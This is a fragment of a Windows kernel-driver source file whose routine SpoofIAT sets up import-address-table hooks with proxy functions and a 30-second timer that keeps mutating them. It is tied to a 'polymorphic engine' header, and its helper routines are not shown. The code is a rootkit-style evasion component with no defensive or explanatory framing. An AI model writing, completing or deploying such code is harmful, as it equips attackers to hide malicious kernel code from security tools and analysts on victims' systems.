#include <ntifs.h>
#include "polymorphic_engine.h"

#define MAX_IAT_HOOKS 128
#define IAT_MUTATION_INTERVAL 30000 // 30 seconds

typedef struct _IAT_HOOK_ENTRY {
    PVOID OriginalFunction;
    PVOID HookedFunction;
    PVOID ProxyFunction;
    BOOLEAN IsActive;
} IAT_HOOK_ENTRY, *PIAT_HOOK_ENTRY;

typedef struct _IAT_CONTEXT {
    IAT_HOOK_ENTRY Hooks[MAX_IAT_HOOKS];
    ULONG HookCount;
    KTIMER MutationTimer;
    KDPC MutationDpc;
} IAT_CONTEXT, *PIAT_CONTEXT;

NTSTATUS SpoofIAT(PPOLYMORPHIC_CONTEXT Context) {
    NTSTATUS status = STATUS_SUCCESS;
    PIAT_CONTEXT iatContext;
    
    // Allocate and initialize IAT context
    iatContext = ExAllocatePoolWithTag(NonPagedPool, sizeof(IAT_CONTEXT), 'TAIS');
    if (!iatContext) return STATUS_INSUFFICIENT_RESOURCES;
    
    RtlZeroMemory(iatContext, sizeof(IAT_CONTEXT));
    
    // Setup IAT hooks with proxy functions
    status = SetupIATHooks(iatContext);
    if (!NT_SUCCESS(status)) {
        ExFreePoolWithTag(iatContext, 'TAIS');
        return status;
    }
    
    // Initialize mutation timer
    KeInitializeTimer(&iatContext->MutationTimer);
    KeInitializeDpc(&iatContext->MutationDpc, IATMutationDpcRoutine, iatContext);
    
    // Start periodic IAT mutation
    StartIATMutation(iatContext);
    
    return status;
} 